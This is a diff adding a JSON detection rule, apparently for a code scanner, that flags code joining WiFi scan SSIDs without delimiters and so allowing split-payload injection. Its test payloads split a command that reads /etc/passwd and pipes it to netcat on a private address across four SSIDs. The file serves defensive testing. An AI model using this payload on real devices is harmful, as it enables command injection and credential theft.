@@ -1,0 +1,49 @@
+{
+  "class": "wifi_chain",
+  "name": "Multi-SSID Chain Attack Surface",
+  "severity": "medium",
+  "description": "WiFi scan results concatenated without delimiters, enabling split-payload attacks across multiple SSIDs",
+  "cwe": "CWE-20",
+  "zero_click": true,
+  "source_patterns": {
+    "c": [
+      "strcat\\s*\\(.*ssid.*ssid",
+      "sprintf\\s*\\(.*%s.*%s.*ssid",
+      "for.*scan_result.*strcat",
+      "while.*bss.*strcat.*ssid",
+      "for.*bss_list.*sprintf.*ssid"
+    ],
+    "python": [
+      "\\.join\\s*\\(.*ssid",
+      "\\+\\s*=.*ssid.*for",
+      "concat.*ssid",
+      "''\\.join.*ssid",
+      "\"\"\\.join.*ssid"
+    ],
+    "javascript": [
+      "\\.join\\s*\\(.*ssid",
+      "\\+=.*ssid.*for",
+      "concat\\s*\\(.*ssid",
+      "reduce\\s*\\(.*ssid.*\\+"
+    ],
+    "go": [
+      "strings\\.Join\\s*\\(.*ssid",
+      "strings\\.Builder.*ssid.*for"
+    ],
+    "ruby": [
+      "\\.join\\s*\\(.*ssid",
+      "\\.map.*ssid.*\\.join"
+    ]
+  },
+  "detection_logic": "Flag code that concatenates or joins multiple SSIDs from scan results into a single string without inserting delimiters or resetting parsing context",
+  "safe_patterns": [
+    "\\.join\\s*\\(['\"].*['\"].*ssid",
+    "strings\\.Join\\s*\\(.*,\\s*['\"]"
+  ],
+  "test_payloads": [
+    "$(cat /et",
+    "c/passwd)",
+    "|nc 10.0.",
+    "0.1 4444|"
+  ]
+}
